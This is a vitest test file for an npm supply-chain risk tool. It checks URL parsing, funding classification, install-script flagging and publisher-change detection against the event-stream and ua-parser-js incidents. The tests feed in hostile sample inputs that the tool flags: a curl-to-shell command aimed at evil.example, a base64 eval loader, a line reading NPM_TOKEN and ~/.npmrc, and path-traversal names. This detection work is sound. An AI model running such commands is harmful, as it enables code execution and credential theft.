import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { HttpClient } from '../../core/http.js';
import type { EnrichContext } from '../../core/plugin.js';
import { factsFor, isFactOf, npmPurl } from '../../core/types.js';
import type { Component, Fact, Inventory } from '../../core/types.js';
import {
  NpmSnapshotStore,
  analyzeInstallScripts,
  createNpmEnricher,
  fundingFromManifestField,
  packumentFacts,
  packumentUrl,
  parseRepoUrl,
  scriptFlags,
  versionHistory,
} from './index.js';
import type { NpmInstallScriptValue, NpmMaintainerChangeValue, NpmPublisherChangeValue, Packument } from './index.js';

const FIXTURES = join(import.meta.dirname, '../../../test/fixtures/npm');

async function loadPackument(name: string): Promise<Packument> {
  const env = JSON.parse(await readFile(join(FIXTURES, `${name}.json`), 'utf8')) as { response: Packument };
  return env.response;
}

function kinds(facts: Fact[]): string[] {
  return facts.map((f) => f.kind).sort();
}

function comp(name: string, version: string): Component {
  return { purl: npmPurl(name, version), ecosystem: 'npm', name, version };
}

function inventory(...components: Component[]): Inventory {
  return {
    assets: [{ id: 'repo:app', kind: 'repo', name: 'app', environment: 'prod', criticality: 3, sourceFile: 'package.json' }],
    components,
    edges: components.map((c) => ({ from: 'repo:app', to: c.purl, scope: 'runtime' as const, direct: true })),
  };
}

function context(now: string, extra: ConstructorParameters<typeof HttpClient>[0] = {}) {
  const warnings: string[] = [];
  const http = new HttpClient({ offline: true, cacheDir: false, fixturesDir: FIXTURES, minIntervalMs: 0, ...extra });
  const ctx: EnrichContext = { http, now: new Date(now), offline: true, warn: (m) => warnings.push(m) };
  return { ctx, warnings, http };
}

describe('registry helpers', () => {
  it('builds packument URLs with encoded scopes and rejects bad names', () => {
    expect(packumentUrl('event-stream')).toBe('https://registry.npmjs.org/event-stream');
    expect(packumentUrl('@babel/core')).toBe('https://registry.npmjs.org/@babel%2Fcore');
    expect(() => packumentUrl('../etc/passwd')).toThrow(/Invalid npm package name/);
    expect(() => packumentUrl('a b')).toThrow();
  });
});

describe('parseRepoUrl', () => {
  it.each([
    ['git://github.com/dominictarr/event-stream.git', 'https://github.com/dominictarr/event-stream'],
    ['git+https://github.com/faisalman/ua-parser-js.git', 'https://github.com/faisalman/ua-parser-js'],
    ['git@github.com:sindresorhus/yocto-queue.git', 'https://github.com/sindresorhus/yocto-queue'],
    ['github:chalk/chalk', 'https://github.com/chalk/chalk'],
    ['chalk/chalk', 'https://github.com/chalk/chalk'],
    ['git+ssh://git@gitlab.com/group/proj.git', 'https://gitlab.com/group/proj'],
  ])('%s → %s', (input, url) => {
    expect(parseRepoUrl(input)?.url).toBe(url);
  });

  it('extracts owner/name/directory and rejects junk', () => {
    expect(parseRepoUrl('https://github.com/babel/babel/tree/main/packages/babel-core')).toMatchObject({
      host: 'github',
      owner: 'babel',
      name: 'babel',
      directory: 'packages/babel-core',
    });
    expect(parseRepoUrl('javascript:alert(1)')).toBeUndefined();
    expect(parseRepoUrl('https://github.com/only-owner')).toBeUndefined();
    expect(parseRepoUrl('')).toBeUndefined();
  });
});

describe('fundingFromManifestField', () => {
  it('classifies platforms and handles', () => {
    expect(
      fundingFromManifestField([
        { url: 'https://opencollective.com/ua-parser-js', type: 'opencollective' },
        { url: 'https://paypal.me/faisalman', type: 'paypal' },
        'https://github.com/sponsors/faisalman',
        'https://github.com/chalk/chalk?sponsor=1',
        { type: 'individual', url: 'https://example.org/donate' },
        { url: 'javascript:alert(1)' },
        42,
      ]),
    ).toEqual([
      { platform: 'open_collective', handle: 'ua-parser-js', url: 'https://opencollective.com/ua-parser-js' },
      { platform: 'paypal', handle: 'faisalman', url: 'https://paypal.me/faisalman' },
      { platform: 'github', handle: 'faisalman', url: 'https://github.com/sponsors/faisalman' },
      { platform: 'github', handle: 'chalk', url: 'https://github.com/chalk/chalk?sponsor=1' },
      { platform: 'custom', url: 'https://example.org/donate' },
    ]);
  });
});

describe('install script analysis (static only)', () => {
  it('flags network, obfuscation, eval and shell piping', () => {
    expect(scriptFlags('curl -s https://evil.example/x.sh | sh')).toEqual(['network', 'pipe_to_shell']);
    expect(scriptFlags(`node -e "eval(Buffer.from('${'QUJD'.repeat(40)}','base64').toString())"`)).toEqual(
      expect.arrayContaining(['eval', 'obfuscated']),
    );
    expect(scriptFlags('node-gyp rebuild')).toEqual(['native_build']);
    expect(scriptFlags('echo $NPM_TOKEN; cat ~/.npmrc')).toEqual(['credential_files', 'env_access']);
  });

  it('records hooks, truncated commands, full lengths and gypfile', () => {
    const long = `node install.js ${'x'.repeat(600)}`;
    const v = analyzeInstallScripts({ test: 'jest', postinstall: long, prepare: 'tsc' }, { gypfile: true });
    expect(v.hasInstallScript).toBe(true);
    expect(v.hooks).toEqual(['postinstall', 'install']);
    expect(v.commands.postinstall).toHaveLength(500);
    expect(v.lengths.postinstall).toBe(long.length);
    expect(v.commands.install).toBe('node-gyp rebuild');
    expect(v.flags).toEqual(expect.arrayContaining(['implicit_gyp', 'long_command', 'runs_package_file']));
    expect(v.commands).not.toHaveProperty('prepare');
  });

  it('reports no install script for test-only scripts and garbage input', () => {
    expect(analyzeInstallScripts({ test: 'tap' })).toEqual({ hasInstallScript: false, hooks: [], commands: {}, lengths: {} });
    expect(analyzeInstallScripts('preinstall').hasInstallScript).toBe(false);
    expect(analyzeInstallScripts({ preinstall: 42 }).hooks).toEqual([]);
  });
});

describe('event-stream (publisher handover, 2018)', () => {
  const NOW = new Date('2018-11-25T00:00:00Z');

  it('emits publisher_change for 3.3.6 with history context and the added dependency', async () => {
    const p = await loadPackument('event-stream');
    const facts = packumentFacts(p, 'event-stream', '3.3.6', { now: NOW });
    const purl = npmPurl('event-stream', '3.3.6');

    const [change, ...rest] = facts.filter(isFactOf('publisher_change'));
    expect(rest).toHaveLength(0);
    expect(change!.subject).toBe(purl);
    expect(change!.value as NpmPublisherChangeValue).toEqual({
      version: '3.3.5',
      previousVersion: '3.3.4',
      previousPublisher: 'dominictarr',
      newPublisher: 'right9ctrl',
      changedAt: '2018-09-05T05:27:47.219Z',
      firstTimePublisher: true,
      scannedVersion: '3.3.6',
      firstSeenVersion: '3.3.5',
      daysBeforeRelease: 4,
      previousPublishers: ['dominictarr'],
      addedDependencies: ['flatmap-stream'],
    });
    expect(change!.evidence).toContain('https://www.npmjs.com/package/event-stream/v/3.3.5');

    const publisher = facts.find(isFactOf('publisher'))!;
    expect(publisher.value).toEqual({ name: 'right9ctrl', version: '3.3.6', publishedAt: '2018-09-09T08:28:59.503Z' });
    expect(publisher.value).not.toHaveProperty('email');
  });

  it('marks firstTimePublisher on the first version by the new account', async () => {
    const p = await loadPackument('event-stream');
    const change = packumentFacts(p, 'event-stream', '3.3.5', { now: NOW }).find(isFactOf('publisher_change'))!;
    expect(change.value).toMatchObject({ version: '3.3.5', firstTimePublisher: true, daysBeforeRelease: 0, addedDependencies: [] });
  });

  it('emits maintainer_change when the maintainer set differs from the previous version', async () => {
    const p = await loadPackument('event-stream');
    const at336 = packumentFacts(p, 'event-stream', '3.3.6', { now: NOW }).filter(isFactOf('maintainer_change'));
    expect(at336.map((f) => f.value)).toEqual([
      { added: ['right9ctrl'], removed: [], changedAt: '2018-09-05T05:27:47.219Z', version: '3.3.5', daysBeforeRelease: 4, via: 'version-history' },
    ]);

    const at400 = packumentFacts(p, 'event-stream', '4.0.0', { now: NOW }).filter(isFactOf('maintainer_change'));
    expect(at400.map((f) => (f.value as NpmMaintainerChangeValue).version)).toEqual(['4.0.0', '3.3.5']);
    expect(at400[0]!.value).toMatchObject({ added: [], removed: ['dominictarr'], daysBeforeRelease: 0 });
  });

  it('emits no change signals for the long-standing maintainer release 3.3.4', async () => {
    const p = await loadPackument('event-stream');
    const facts = packumentFacts(p, 'event-stream', '3.3.4', { now: NOW });
    expect(facts.filter((f) => f.kind === 'publisher_change' || f.kind === 'maintainer_change')).toEqual([]);
  });

  it('respects the change window', async () => {
    const p = await loadPackument('event-stream');
    const facts = packumentFacts(p, 'event-stream', '4.0.1', { now: NOW, changeWindowDays: 7 });
    expect(facts.filter(isFactOf('publisher_change'))).toEqual([]);
    expect(facts.filter(isFactOf('maintainer_change'))).toEqual([]);
  });

  it('time-travels: release_age ignores versions published after `now`', async () => {
    const p = await loadPackument('event-stream');
    const now = new Date('2018-09-10T00:00:00Z');
    const age = packumentFacts(p, 'event-stream', '3.3.6', { now }).find(isFactOf('release_age'))!;
    expect(age.value).toEqual({
      version: '3.3.6',
      publishedAt: '2018-09-09T08:28:59.503Z',
      ageDays: 0,
      latestVersion: '3.3.6',
      latestPublishedAt: '2018-09-09T08:28:59.503Z',
      daysSinceLatestRelease: 0,
    });
    expect(versionHistory(p, now).map((h) => h.version)).not.toContain('4.0.0');
  });

  it('emits package-level repo and maintainers facts on the unversioned purl', async () => {
    const p = await loadPackument('event-stream');
    const facts = packumentFacts(p, 'event-stream', '3.3.6', { now: NOW });
    expect(facts.find(isFactOf('repo'))).toMatchObject({
      subject: 'pkg:npm/event-stream',
      value: { url: 'https://github.com/dominictarr/event-stream', host: 'github', owner: 'dominictarr', name: 'event-stream', via: 'npm.repository' },
    });
    expect(facts.find(isFactOf('maintainers'))!.value).toEqual({ maintainers: [{ name: 'right9ctrl' }], count: 1 });
  });
});

describe('ua-parser-js (account takeover, 2021)', () => {
  const NOW = new Date('2021-10-22T13:00:00Z');

  it('shows no publisher or maintainer change for 0.7.29 (same account published it)', async () => {
    const p = await loadPackument('ua-parser-js');
    const facts = packumentFacts(p, 'ua-parser-js', '0.7.29', { now: NOW });
    expect(facts.find(isFactOf('publisher'))!.value.name).toBe('faisalman');
    expect(facts.filter((f) => f.kind === 'publisher_change' || f.kind === 'maintainer_change')).toEqual([]);
  });

  it('reports the preinstall hook with static flags', async () => {
    const p = await loadPackument('ua-parser-js');
    const facts = packumentFacts(p, 'ua-parser-js', '0.7.29', { now: NOW });
    const script = facts.find(isFactOf('install_script'))!.value as NpmInstallScriptValue;
    expect(script).toEqual({
      hasInstallScript: true,
      hooks: ['preinstall'],
      commands: { preinstall: 'start /B node preinstall.js & node preinstall.js' },
      lengths: { preinstall: 48 },
      // Publishing anomaly: 0.7.28 had no install hook (regression for the PLAN §6 ua-parser-js case).
      flags: ['background_process', 'new_install_hook', 'runs_package_file'],
      newHooks: ['preinstall'],
      previousVersion: '0.7.28',
    });
    const prior = packumentFacts(p, 'ua-parser-js', '0.7.28', { now: NOW }).find(isFactOf('install_script'))!;
    expect(prior.value.hasInstallScript).toBe(false);
  });

  it('reports release age (hours old) and funding sources', async () => {
    const p = await loadPackument('ua-parser-js');
    const facts = packumentFacts(p, 'ua-parser-js', '0.7.29', { now: NOW });
    expect(facts.find(isFactOf('release_age'))!.value).toMatchObject({ ageDays: 0, latestVersion: '1.0.0' });
    expect(facts.find(isFactOf('funding'))!.value).toEqual({
      via: 'package.json#funding',
      sources: [
        { platform: 'open_collective', handle: 'ua-parser-js', url: 'https://opencollective.com/ua-parser-js' },
        { platform: 'paypal', handle: 'faisalman', url: 'https://paypal.me/faisalman' },
      ],
    });
    expect(facts.find(isFactOf('provenance'))!.value).toEqual({ hasProvenance: false });
  });
});

describe('yocto-queue (healthy package)', () => {
  const NOW = new Date('2026-10-01T00:00:00Z');

  it('emits only neutral facts', async () => {
    const p = await loadPackument('yocto-queue');
    const facts = packumentFacts(p, 'yocto-queue', '1.2.2', { now: NOW });
    expect(kinds(facts)).toEqual(['funding', 'install_script', 'maintainers', 'provenance', 'publisher', 'release_age', 'repo']);
    expect(facts.find(isFactOf('install_script'))!.value.hasInstallScript).toBe(false);
    expect(facts.find(isFactOf('release_age'))!.value).toMatchObject({ version: '1.2.2', ageDays: 323, latestVersion: '1.2.2' });
    expect(facts.find(isFactOf('funding'))!.value.sources).toEqual([
      { platform: 'github', handle: 'sindresorhus', url: 'https://github.com/sponsors/sindresorhus' },
    ]);
  });

  it('skips versions without a maintainers list instead of reporting a change', async () => {
    const p = await loadPackument('yocto-queue');
    expect(packumentFacts(p, 'yocto-queue', '1.2.0', { now: NOW }).filter(isFactOf('maintainer_change'))).toEqual([]);
  });

  it('keeps e-mails only when asked', async () => {
    const p = await loadPackument('yocto-queue');
    const facts = packumentFacts(p, 'yocto-queue', '1.2.2', { now: NOW, includeEmails: true });
    expect(facts.find(isFactOf('publisher'))!.value.email).toBe('redacted@example.invalid');
  });

  // Regression (PLAN §7 data minimisation): committed fixtures carry no real e-mail addresses.
  it('ships fixtures without real e-mail addresses', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const { fileURLToPath } = await import('node:url');
    const root = fileURLToPath(new URL('../../../test/fixtures', import.meta.url));
    const files = ((await readdir(root, { recursive: true })) as string[]).filter((f) => f.endsWith('.json'));
    expect(files.length).toBeGreaterThan(10);
    const EMAIL = /[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}\b/g; // not package specs like left-pad@1.3.0
    for (const f of files) {
      const found = ((await readFile(`${root}/${f}`, 'utf8')).match(EMAIL) ?? []).filter((e) => !e.endsWith('@example.invalid'));
      expect(found, f).toEqual([]);
    }
  });
});

describe('synthetic histories', () => {
  const t = (d: string) => `${d}T00:00:00.000Z`;
  function packument(versions: Record<string, { user: string; trusted?: boolean; maintainers?: string[]; date: string; extra?: object }>): Packument {
    const p: Packument = { name: 'demo', versions: {}, time: {}, 'dist-tags': {} };
    for (const [v, x] of Object.entries(versions)) {
      p.versions![v] = {
        name: 'demo',
        version: v,
        _npmUser: x.trusted ? { name: 'GitHub Actions', email: 'npm-oidc-no-reply@github.com', trustedPublisher: { id: 'github' } } : { name: x.user },
        ...(x.maintainers ? { maintainers: x.maintainers.map((name) => ({ name })) } : {}),
        ...x.extra,
      };
      p.time![v] = t(x.date);
      p['dist-tags']!.latest = v;
    }
    return p;
  }

  it('does not flag trusted-publishing (OIDC) releases as a publisher change', () => {
    const p = packument({
      '1.0.0': { user: 'alice', date: '2026-01-01' },
      '1.1.0': { user: 'x', trusted: true, date: '2026-02-01', extra: { dist: { attestations: { url: 'https://registry.npmjs.org/-/npm/v1/attestations/demo@1.1.0', provenance: { predicateType: 'https://slsa.dev/provenance/v1' } } } } },
    });
    const facts = packumentFacts(p, 'demo', '1.1.0', { now: new Date('2026-03-01') });
    expect(facts.filter(isFactOf('publisher_change'))).toEqual([]);
    expect(facts.find(isFactOf('publisher'))!.value.trustedPublisher).toBe(true);
    expect(facts.find(isFactOf('provenance'))!.value).toEqual({
      hasProvenance: true,
      type: 'slsa-v1',
      url: 'https://registry.npmjs.org/-/npm/v1/attestations/demo@1.1.0',
    });
  });

  it('does not flag a publisher who was the original author', () => {
    const p = packument({
      '1.0.0': { user: 'alice', date: '2026-01-01' },
      '1.1.0': { user: 'bob', date: '2026-01-02' },
      '1.2.0': { user: 'alice', date: '2026-01-03' },
    });
    expect(packumentFacts(p, 'demo', '1.2.0', { now: new Date('2026-02-01') }).filter(isFactOf('publisher_change'))).toEqual([]);
    expect(packumentFacts(p, 'demo', '1.1.0', { now: new Date('2026-02-01') }).filter(isFactOf('publisher_change'))).toHaveLength(1);
  });

  it('handles hostile/garbage packument fields without throwing', () => {
    const p = {
      name: 'demo',
      versions: { '1.0.0': { _npmUser: 'nope', maintainers: 'x', scripts: ['preinstall'], dist: 5, repository: { url: 7 }, funding: { url: null } } },
      time: { '1.0.0': 'not a date' },
      maintainers: [{ name: 5 }, 'carol <c@example.org>', null],
      'dist-tags': 'latest',
    } as unknown as Packument;
    const facts = packumentFacts(p, 'demo', '1.0.0', { now: new Date('2026-02-01') });
    expect(kinds(facts)).toEqual(['install_script', 'maintainers', 'provenance']);
    expect(facts.find(isFactOf('maintainers'))!.value).toEqual({ maintainers: [{ name: 'carol' }], count: 1 });
  });

  it('returns only package-level facts for a version missing from the packument', () => {
    const p = packument({ '1.0.0': { user: 'alice', maintainers: ['alice'], date: '2026-01-01' } });
    p.maintainers = [{ name: 'alice' }];
    expect(kinds(packumentFacts(p, 'demo', '9.9.9', { now: new Date('2026-02-01') }))).toEqual(['maintainers']);
  });
});

describe('createNpmEnricher (offline, fixture envelopes)', () => {
  it('fetches each packument once and emits facts for every npm component', async () => {
    const { ctx, warnings, http } = context('2018-11-25T00:00:00Z');
    const inv = inventory(comp('event-stream', '3.3.6'), comp('event-stream', '3.3.4'), comp('yocto-queue', '1.2.2'));
    inv.components.push({ purl: 'pkg:githubactions/actions/checkout@v4', ecosystem: 'githubactions', name: 'actions/checkout', version: 'v4' });
    const facts = await createNpmEnricher().enrich(inv, ctx);

    expect(warnings).toEqual([]);
    expect(http.requestCount).toBe(0); // offline: fixtures only
    expect(factsFor(facts, npmPurl('event-stream', '3.3.6'), 'publisher_change')).toHaveLength(1);
    expect(factsFor(facts, npmPurl('event-stream', '3.3.4'), 'publisher_change')).toHaveLength(0);
    expect(facts.filter((f) => f.kind === 'repo' && f.subject === 'pkg:npm/event-stream')).toHaveLength(1);
    expect(facts.every((f) => f.source === 'npm' && f.fetchedAt === '2018-11-25T00:00:00.000Z')).toBe(true);
    expect(facts.some((f) => f.subject.startsWith('pkg:githubactions'))).toBe(false);
  });

  it('turns missing fixtures, 404s, unpublished versions and bad names into warnings', async () => {
    const { ctx, warnings } = context('2021-10-22T13:00:00Z', {
      fixtures: { 'https://registry.npmjs.org/@acme%2Fgone': { status: 404, response: { error: 'Not found' } } },
    });
    const inv = inventory(comp('ua-parser-js', '0.7.31'), comp('@acme/gone', '1.0.0'), comp('left-pad', '1.3.0'));
    inv.components.push({ purl: 'pkg:npm/bad', ecosystem: 'npm', name: '../bad', version: '1.0.0' });
    const facts = await createNpmEnricher().enrich(inv, ctx);
    expect(warnings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('invalid package name'),
        expect.stringContaining('@acme/gone not found'),
        expect.stringContaining('ua-parser-js@0.7.31 not present'),
        expect.stringContaining('1 packument(s) missing from fixtures/cache in offline mode: left-pad'),
      ]),
    );
    expect(kinds(facts)).toEqual(['maintainers', 'repo']);
  });
});

describe('snapshots', () => {
  let dir: string | undefined;
  afterEach(async () => {
    if (dir) await rm(dir, { recursive: true, force: true });
    dir = undefined;
  });

  it('records summaries and emits maintainer_change against the previous snapshot', async () => {
    dir = await mkdtemp(join(tmpdir(), 'br-snap-'));
    const store = new NpmSnapshotStore(dir);
    await store.record({
      name: 'event-stream',
      takenAt: '2018-08-01T00:00:00.000Z',
      maintainers: ['dominictarr'],
      distTags: { latest: '3.3.4' },
      versionCount: 9,
    });
    const { ctx } = context('2018-11-25T00:00:00Z');
    const facts = await createNpmEnricher({ snapshots: store }).enrich(inventory(comp('event-stream', '3.3.6')), ctx);
    const snap = facts.filter(isFactOf('maintainer_change')).find((f) => f.subject === 'pkg:npm/event-stream')!;
    expect(snap.value).toEqual({
      added: ['right9ctrl'],
      removed: ['dominictarr'],
      changedAt: '2018-11-25T00:00:00.000Z',
      via: 'snapshot',
      previousSnapshotAt: '2018-08-01T00:00:00.000Z',
    });
    const saved = await store.list('event-stream');
    expect(saved.map((s) => s.takenAt)).toEqual(['2018-08-01T00:00:00.000Z', '2018-11-25T00:00:00.000Z']);
    expect(saved[1]).toMatchObject({ maintainers: ['right9ctrl'], latestVersion: '4.0.1', latestPublisher: 'right9ctrl' });
    expect(JSON.stringify(saved)).not.toContain('@');
  });

  it("is off by default in offline mode ('auto')", async () => {
    dir = await mkdtemp(join(tmpdir(), 'br-snap-'));
    const { ctx } = context('2018-11-25T00:00:00Z');
    await createNpmEnricher({ snapshotDir: dir }).enrich(inventory(comp('event-stream', '3.3.6')), ctx);
    expect(await new NpmSnapshotStore(dir).list('event-stream')).toEqual([]);
  });

  it('encodes scoped names into safe file names', () => {
    const store = new NpmSnapshotStore('/tmp/x');
    expect(store.pathFor('@babel/core')).toBe('/tmp/x/npm/%40babel%2Fcore.json');
    expect(() => store.pathFor('../../etc')).toThrow();
  });
});
